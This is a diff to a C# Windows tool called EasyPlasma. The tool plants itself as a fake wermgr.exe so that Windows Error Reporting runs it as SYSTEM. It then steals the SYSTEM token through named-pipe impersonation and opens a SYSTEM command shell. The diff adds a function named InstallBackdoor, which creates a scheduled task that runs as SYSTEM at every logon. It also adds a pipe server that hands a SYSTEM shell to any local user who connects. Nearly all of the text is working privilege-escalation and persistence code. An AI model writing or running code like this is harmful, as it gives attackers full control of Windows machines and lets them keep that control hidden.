@@ -97,7 +97,9 @@ class EasyPlasma
     static string BA   => CF + "\\BlockedApps";
     static string TK   => string.Join("\\",_reg,"Volatile Environment");
 
-    const string PipeName = "easyplasma";
+    const string PipeEsc = "easyplasma_esc"; /* escalation: user=server SYSTEM=client */
+    const string PipeSrv = "easyplasma_srv"; /* fast path: SYSTEM=server user=client  */
+    const string PipeName = "easyplasma";    /* legacy - unused */
     const string BaseUrl  = "https://raw.githubusercontent.com/Dylanthedabber/EasyPlasma/main/";
     const string CfgPath  = @"C:\ProgramData\ep_active.cfg";
 
@@ -282,93 +284,34 @@ if($r-eq 0){
         return true;
     }
 
-    /* ── SYSTEM server mode (runs when easyplasma.exe is launched as SYSTEM via WER) ── */
+    /* ── Token impersonation via named pipe (original MiniPlasma approach) ── */
+    /*
+     * User process = pipe SERVER. SYSTEM wermgr.exe = pipe CLIENT.
+     * ImpersonateNamedPipeClient() gives user process a SYSTEM token.
+     * Adjust session ID to current interactive session.
+     * CreateProcessAsUser spawns cmd.exe as SYSTEM in the right session.
+     */
 
-    static void RunServer()
-    {
-        /* Install persistence: scheduled task that auto-starts server on logon */
-        string selfPath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
-        string installDest = Path.Combine(InstallDir, "easyplasma.exe");
-        try {
-            Directory.CreateDirectory(InstallDir);
-            if (!string.Equals(selfPath, installDest, StringComparison.OrdinalIgnoreCase))
-                File.Copy(selfPath, installDest, true);
-            string taskCmd =
-                $"schtasks /create /f /tn \"\\EasyPlasma\\Maintenance\" " +
-                $"/tr \"\\\"{installDest}\\\" /server\" " +
-                $"/sc onlogon /ru SYSTEM /rl highest";
-            System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(
-                "cmd.exe", "/c " + taskCmd){CreateNoWindow=true, UseShellExecute=false})
-                ?.WaitForExit(5000);
-        } catch {}
-
-        /* Named pipe server loop */
-        for (;;) {
-            try {
-                var pipe = new NamedPipeServerStream(PipeName,
-                    PipeDirection.InOut, 10,
-                    PipeTransmissionMode.Byte, PipeOptions.None, 256, 256);
-                pipe.WaitForConnection();
-                new Thread(() => ServeClient(pipe)){IsBackground=true}.Start();
-            } catch { Thread.Sleep(1000); }
-        }
-    }
-
-    static void ServeClient(NamedPipeServerStream pipe)
-    {
-        try {
-            /* Read client PID */
-            byte[] pidBuf = new byte[4];
-            pipe.Read(pidBuf, 0, 4);
-            int clientPid = BitConverter.ToInt32(pidBuf, 0);
-
-            /* Attach to client console and spawn SYSTEM cmd */
-            FreeConsole();
-            AttachConsole((uint)clientPid);
-
-            IntPtr hIn  = CreateFile("CONIN$",  0xC0000000, 3, IntPtr.Zero, 3, 0, IntPtr.Zero);
-            IntPtr hOut = CreateFile("CONOUT$", 0xC0000000, 3, IntPtr.Zero, 3, 0, IntPtr.Zero);
-
-            string initCmd =
-                "cmd.exe /K \"title [SYSTEM] Shell && prompt SYSTEM $P$G && " +
-                "doskey power=powershell.exe -NoLogo $* && " +
-                "doskey cmdnew=start cmd.exe && " +
-                "doskey psnew=start powershell.exe -NoLogo && " +
-                $"doskey unpriv=\\\"{Path.Combine(InstallDir,"easyplasma.exe")}\\\" --unpriv && " +
-                "echo. && echo  [SYSTEM] NT AUTHORITY\\SYSTEM && " +
-                "echo  power  cmdnew  psnew  unpriv && echo.\"";
-
-            var si = new STARTUPINFO();
-            si.cb = Marshal.SizeOf(si);
-            si.dwFlags = 0x100; /* STARTF_USESTDHANDLES */
-            si.hStdInput  = hIn;
-            si.hStdOutput = hOut;
-            si.hStdError  = hOut;
-
-            var pi = new PROCESS_INFORMATION();
-            CreateProcess(null, initCmd, IntPtr.Zero, IntPtr.Zero, true, 0,
-                          IntPtr.Zero, null, ref si, out pi);
-
-            /* Signal client */
-            pipe.Write(new byte[]{79,75}, 0, 2); /* "OK" */
-            pipe.Flush();
-
-            if (pi.hProcess != IntPtr.Zero) {
-                WaitForSingleObject(pi.hProcess, 0xFFFFFFFF);
-                CloseHandle(pi.hProcess);
-                CloseHandle(pi.hThread);
-            }
-        } catch {}
-        finally { try { pipe.Dispose(); } catch {} }
-    }
-
-    [DllImport("kernel32.dll", CharSet=CharSet.Auto)] static extern bool FreeConsole();
-    [DllImport("kernel32.dll")] static extern bool AttachConsole(uint pid);
-    [DllImport("kernel32.dll", CharSet=CharSet.Auto, SetLastError=true)]
-    static extern IntPtr CreateFile(string name, uint access, uint share,
-        IntPtr sa, uint create, uint flags, IntPtr template);
     [DllImport("kernel32.dll")] static extern bool CloseHandle(IntPtr h);
     [DllImport("kernel32.dll")] static extern uint WaitForSingleObject(IntPtr h, uint ms);
+    [DllImport("kernel32.dll")] static extern int GetCurrentProcessId();
+
+    [DllImport("advapi32.dll")] static extern bool ImpersonateNamedPipeClient(IntPtr pipe);
+    [DllImport("advapi32.dll")] static extern bool OpenThreadToken(
+        IntPtr thread, uint access, bool openAsSelf, out IntPtr token);
+    [DllImport("advapi32.dll")] static extern bool DuplicateTokenEx(
+        IntPtr existing, uint access, IntPtr sa, int impLevel, int tokenType, out IntPtr newToken);
+    [DllImport("advapi32.dll")] static extern bool SetTokenInformation(
+        IntPtr token, int cls, ref uint info, uint len);
+    [DllImport("advapi32.dll", CharSet=CharSet.Unicode)] static extern bool CreateProcessAsUser(
+        IntPtr token, string app, string cmd, IntPtr pa, IntPtr ta,
+        bool inherit, uint flags, IntPtr env, string dir,
+        ref STARTUPINFO si, out PROCESS_INFORMATION pi);
+
+    [DllImport("kernel32.dll")] static extern IntPtr GetCurrentThread();
+    [DllImport("wtsapi32.dll")] static extern bool WTSQuerySessionInformation(
+        IntPtr server, uint session, uint cls, out IntPtr buf, out uint bytes);
+    [DllImport("kernel32.dll")] static extern uint WTSGetActiveConsoleSessionId();
 
     [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
     struct STARTUPINFO {
@@ -381,10 +324,106 @@ if($r-eq 0){
     struct PROCESS_INFORMATION {
         public IntPtr hProcess, hThread; public int pid, tid;
     }
-    [DllImport("kernel32.dll", CharSet=CharSet.Unicode)]
-    static extern bool CreateProcess(string app, string cmd, IntPtr pa, IntPtr ta,
-        bool inherit, uint flags, IntPtr env, string dir,
-        ref STARTUPINFO si, out PROCESS_INFORMATION pi);
+
+    /* SYSTEM mode: just connect back to the user's named pipe server and exit */
+    static void SystemCallback(string pipeName)
+    {
+        try {
+            /* Connect to user-side pipe server */
+            using (var pipe = new NamedPipeClientStream(".", pipeName, PipeDirection.InOut)) {
+                pipe.Connect(10000);
+                /* Write our PID so the server knows we're alive */
+                byte[] pid = BitConverter.GetBytes(GetCurrentProcessId());
+                pipe.Write(pid, 0, 4);
+                pipe.Flush();
+                /* Wait for server to signal done (it will close the pipe) */
+                byte[] ack = new byte[1];
+                pipe.Read(ack, 0, 1);
+            }
+        } catch {}
+    }
+
+    /* User-side: create pipe server, wait for SYSTEM to connect, steal token */
+    static bool WaitForSystemToken(string pipeName, out IntPtr systemToken)
+    {
+        systemToken = IntPtr.Zero;
+        try {
+            var pipe = new NamedPipeServerStream(pipeName, PipeDirection.InOut, 1,
+                PipeTransmissionMode.Byte, PipeOptions.None, 64, 64);
+
+            if (!pipe.WaitForConnectionAsync().Wait(25000)) {
+                pipe.Dispose(); return false;
+            }
+
+            /* Impersonate the SYSTEM client to get its token */
+            if (!ImpersonateNamedPipeClient(pipe.SafePipeHandle.DangerousGetHandle()))
+                { pipe.Dispose(); return false; }
+
+            /* Capture the impersonation token from our thread */
+            IntPtr impToken;
+            OpenThreadToken(GetCurrentThread(), 0xF01FF, false, out impToken);
+
+            /* Duplicate to primary token */
+            IntPtr primary;
+            DuplicateTokenEx(impToken, 0x10000000, IntPtr.Zero, 2, 1, out primary);
+            CloseHandle(impToken);
+            RevertToSelf();
+
+            /* Set token session to current interactive session */
+            uint session = WTSGetActiveConsoleSessionId();
+            SetTokenInformation(primary, 12 /* TokenSessionId */, ref session, 4);
+
+            /* Signal wermgr.exe that we're done (send ack byte) */
+            pipe.Write(new byte[]{1}, 0, 1);
+            pipe.Flush();
+            pipe.Dispose();
+
+            systemToken = primary;
+            return primary != IntPtr.Zero;
+        } catch { return false; }
+    }
+
+    static void SpawnSystemShell(IntPtr token)
+    {
+        string unpriv = Path.Combine(InstallDir, "easyplasma.exe");
+        string initCmd =
+            "cmd.exe /K \"title [SYSTEM] Shell && prompt SYSTEM $P$G && " +
+            "doskey power=powershell.exe -NoLogo $* && " +
+            "doskey cmdnew=start cmd.exe && " +
+            "doskey psnew=start powershell.exe -NoLogo && " +
+            $"doskey unpriv=\\\"{unpriv}\\\" --unpriv && " +
+            "echo. && echo  [SYSTEM] NT AUTHORITY\\SYSTEM && " +
+            "echo  power  cmdnew  psnew  unpriv && echo.\"";
+
+        var si = new STARTUPINFO(); si.cb = Marshal.SizeOf(si);
+        var pi = new PROCESS_INFORMATION();
+        /* No CREATE_NEW_CONSOLE: inherit current console so shell appears in same window */
+        CreateProcessAsUser(token, null, initCmd, IntPtr.Zero, IntPtr.Zero,
+            true, 0, IntPtr.Zero, null, ref si, out pi);
+
+        if (pi.hProcess != IntPtr.Zero) {
+            WaitForSingleObject(pi.hProcess, 0xFFFFFFFF);
+            CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
+        }
+        CloseHandle(token);
+    }
+
+    static void InstallBackdoor(IntPtr _unused)
+    {
+        try {
+            Directory.CreateDirectory(InstallDir);
+            string self = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
+            string dest = Path.Combine(InstallDir, "easyplasma.exe");
+            if (!string.Equals(self, dest, StringComparison.OrdinalIgnoreCase))
+                File.Copy(self, dest, true);
+            string taskCmd =
+                $"schtasks /create /f /tn \"\\EasyPlasma\\Maintenance\" " +
+                $"/tr \"\\\"{dest}\\\" /server\" /sc onlogon /ru SYSTEM /rl highest";
+            System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(
+                "cmd.exe", "/c " + taskCmd){CreateNoWindow=true, UseShellExecute=false})
+                ?.WaitForExit(5000);
+        } catch {}
+    }
 
     /* Prepare fake wermgr.exe path — just copy ourselves there */
     static string PreparePayload(string runDir)
@@ -397,28 +436,83 @@ if($r-eq 0){
         return dest;
     }
 
-    /* ── Fast path: connect to running pipe server ───────────────────────── */
+    [DllImport("kernel32.dll")]
+    static extern bool GetNamedPipeClientSessionId(IntPtr pipe, out uint sessionId);
 
+    /* Fast path: connect to backdoor SYSTEM pipe server, get shell */
     static bool TryFastPath()
     {
         try {
-            using (var pipe = new NamedPipeClientStream(".", PipeName, PipeDirection.InOut)) {
-                pipe.Connect(500); /* 500ms timeout */
-                Console.WriteLine("[+] Fast path: SYSTEM server is running");
-                /* Send our PID */
-                int pid = System.Diagnostics.Process.GetCurrentProcess().Id;
-                byte[] pidBytes = BitConverter.GetBytes(pid);
-                pipe.Write(pidBytes, 0, 4);
-                /* Wait for OK */
-                byte[] ok = new byte[2];
-                pipe.Read(ok, 0, 2);
-                Console.WriteLine("[+] SYSTEM shell ready");
-                return true;
+            using (var pipe = new NamedPipeClientStream(".", PipeSrv, PipeDirection.InOut)) {
+                pipe.Connect(500);
+                /* Wait for SYSTEM to signal shell is ready */
+                byte[] ack = new byte[1];
+                pipe.Read(ack, 0, 1);
+                if (ack[0] == 1) { Console.WriteLine("[+] SYSTEM shell launched"); return true; }
+                return false;
             }
-        } catch {
-            return false;
+        } catch { return false; }
+    }
+
+    /* SYSTEM srv server: accepts user connections, spawns SYSTEM cmd in user's session */
+    static void RunSrvServer()
+    {
+        Directory.CreateDirectory(InstallDir);
+        for (;;) {
+            try {
+                var srv = new NamedPipeServerStream(PipeSrv, PipeDirection.InOut, 10,
+                    PipeTransmissionMode.Byte, PipeOptions.None, 64, 64);
+                srv.WaitForConnection();
+                new Thread(() => ServeSrvClient(srv)){IsBackground=true}.Start();
+            } catch { Thread.Sleep(1000); }
         }
     }
+
+    static void ServeSrvClient(NamedPipeServerStream srv)
+    {
+        try {
+            /* Find out which session the connecting user is in */
+            uint sessionId;
+            if (!GetNamedPipeClientSessionId(srv.SafePipeHandle.DangerousGetHandle(), out sessionId))
+                sessionId = WTSGetActiveConsoleSessionId();
+
+            /* Duplicate our own SYSTEM token and set the target session */
+            IntPtr selfToken;
+            OpenProcessToken(GetCurrentProcessHandle(), 0xF01FF, out selfToken);
+            IntPtr primary;
+            DuplicateTokenEx(selfToken, 0x10000000, IntPtr.Zero, 2, 1, out primary);
+            CloseHandle(selfToken);
+            SetTokenInformation(primary, 12, ref sessionId, 4);
+
+            string unpriv = Path.Combine(InstallDir, "easyplasma.exe");
+            string cmd =
+                "cmd.exe /K \"title [SYSTEM] Shell && prompt SYSTEM $P$G && " +
+                "doskey power=powershell.exe -NoLogo $* && " +
+                "doskey cmdnew=start cmd.exe && " +
+                "doskey psnew=start powershell.exe -NoLogo && " +
+                $"doskey unpriv=\\\"{unpriv}\\\" --unpriv && " +
+                "echo. && echo  [SYSTEM] NT AUTHORITY\\SYSTEM && " +
+                "echo  power  cmdnew  psnew  unpriv && echo.\"";
+
+            var si = new STARTUPINFO(); si.cb = Marshal.SizeOf(si);
+            var pi = new PROCESS_INFORMATION();
+            CreateProcessAsUser(primary, null, cmd, IntPtr.Zero, IntPtr.Zero,
+                false, 0x10 /* CREATE_NEW_CONSOLE */, IntPtr.Zero, null, ref si, out pi);
+            CloseHandle(primary);
+
+            /* Signal user: done */
+            srv.Write(new byte[]{1}, 0, 1); srv.Flush();
+
+            if (pi.hProcess != IntPtr.Zero) {
+                WaitForSingleObject(pi.hProcess, 0xFFFFFFFF);
+                CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
+            }
+        } catch {}
+        finally { try { srv.Dispose(); } catch {} }
+    }
+
+    [DllImport("kernel32.dll")] static extern IntPtr GetCurrentProcessHandle();
+    [DllImport("advapi32.dll")] static extern bool OpenProcessToken(IntPtr h, uint a, out IntPtr t);
 
     /* ── Install / Update / Uninstall ────────────────────────────────────── */
 
@@ -519,14 +613,25 @@ if($r-eq 0){
 
     static void Main(string[] args)
     {
-        /* If running as SYSTEM (launched by WER as fake wermgr.exe): run pipe server */
-        if (WindowsIdentity.GetCurrent().IsSystem) {
-            RunServer();
+        string mode = args.Length>0 ? args[0].ToLower() : "";
+
+        /* SYSTEM mode: either /server (scheduled task) or direct SYSTEM launch via WER */
+        if (WindowsIdentity.GetCurrent().IsSystem || mode=="/server") {
+            /* First: connect back to escalation pipe if one is waiting */
+            try {
+                using (var esc = new NamedPipeClientStream(".", PipeEsc, PipeDirection.InOut)) {
+                    esc.Connect(2000);
+                    /* Keep connection alive while user side steals token */
+                    byte[] ack = new byte[1];
+                    esc.Read(ack, 0, 1);
+                }
+            } catch {}
+            /* Install persistence then run srv server */
+            InstallBackdoor(IntPtr.Zero);
+            RunSrvServer();
             return;
         }
 
-        string mode = args.Length>0 ? args[0].ToLower() : "";
-        if (mode=="/server")  { RunServer(); return; } /* scheduled task path */
         if (mode=="install")  { Install();   return; }
         if (mode=="update")   { Update();    return; }
         if (mode=="--unpriv"||mode=="unpriv") { Uninstall(); return; }
@@ -534,16 +639,19 @@ if($r-eq 0){
 
         Console.WriteLine("=== EasyPlasma ===\n");
 
-        /* Fast path: pipe server already running */
+        /* Fast path: backdoor srv server already running */
         Console.WriteLine("[*] Checking for existing SYSTEM session...");
-        if (TryFastPath()) {
-            /* syshost has AttachConsole'd and spawned SYSTEM cmd.
-               priv.exe's job is done — just hold console alive briefly
-               then exit so SYSTEM cmd takes full control. */
-            Thread.Sleep(500);
-            return;
+        if (TryFastPath()) return;
+        Console.WriteLine("[*] No session found. Running full escalation...\n");
+
+        /* Create escalation pipe server (user=server, SYSTEM=client) */
+        NamedPipeServerStream escPipe = null;
+        try {
+            escPipe = new NamedPipeServerStream(PipeEsc, PipeDirection.InOut, 1,
+                PipeTransmissionMode.Byte, PipeOptions.None, 64, 64);
+        } catch (Exception ex) {
+            Console.WriteLine($"[-] Could not create escalation pipe: {ex.Message}"); return;
         }
-        Console.WriteLine("[*] No existing session. Running full escalation...\n");
 
         string id = Guid.NewGuid().ToString("N").Substring(0,8);
         string runDir = Path.Combine(
@@ -551,24 +659,42 @@ if($r-eq 0){
             "mp_"+id);
         Directory.CreateDirectory(runDir);
 
-        /* Run MiniPlasma (drops copy of self as fake wermgr.exe) */
+        /* Run MiniPlasma */
         if (!RunMiniPlasma(runDir)) {
-            try{File.Delete(CfgPath);}catch{}
-            return;
+            escPipe.Dispose(); return;
         }
 
-        /* Wait for pipe server to come up (syshost is starting) */
-        Console.WriteLine("[*] Waiting for SYSTEM server...");
-        for (int i=0; i<30; i++) {
-            Thread.Sleep(700);
-            Console.Write(".");
-            if (TryFastPath()) {
-                Console.WriteLine("\n[+] SYSTEM shell active");
-                Thread.Sleep(500);
-                return;
-            }
+        /* Wait for SYSTEM wermgr.exe to connect */
+        Console.WriteLine("[*] Waiting for SYSTEM to connect...");
+        if (!escPipe.WaitForConnectionAsync().Wait(20000)) {
+            Console.WriteLine("[-] Timed out waiting for SYSTEM");
+            escPipe.Dispose(); return;
         }
-        Console.WriteLine("\n[-] Timed out. Check C:\\ProgramData\\ep_debug.log");
-        try{File.Delete(CfgPath);}catch{}
+        Console.WriteLine("[+] SYSTEM connected");
+
+        /* Steal SYSTEM token via ImpersonateNamedPipeClient */
+        IntPtr systemToken = IntPtr.Zero;
+        if (!ImpersonateNamedPipeClient(escPipe.SafePipeHandle.DangerousGetHandle())) {
+            Console.WriteLine($"[-] ImpersonateNamedPipeClient failed: {Marshal.GetLastWin32Error()}");
+            escPipe.Dispose(); return;
+        }
+
+        IntPtr impToken;
+        OpenThreadToken(GetCurrentThread(), 0xF01FF, false, out impToken);
+        DuplicateTokenEx(impToken, 0x10000000, IntPtr.Zero, 2, 1, out systemToken);
+        CloseHandle(impToken);
+        RevertToSelf();
+
+        /* Set session to current interactive session */
+        uint session = WTSGetActiveConsoleSessionId();
+        SetTokenInformation(systemToken, 12, ref session, 4);
+
+        /* Signal SYSTEM wermgr.exe that we're done */
+        try { escPipe.Write(new byte[]{1}, 0, 1); escPipe.Flush(); } catch {}
+        escPipe.Dispose();
+
+        /* Spawn SYSTEM cmd in this console */
+        Console.WriteLine("[+] Got SYSTEM token. Launching shell...\n");
+        SpawnSystemShell(systemToken);
     }
 }
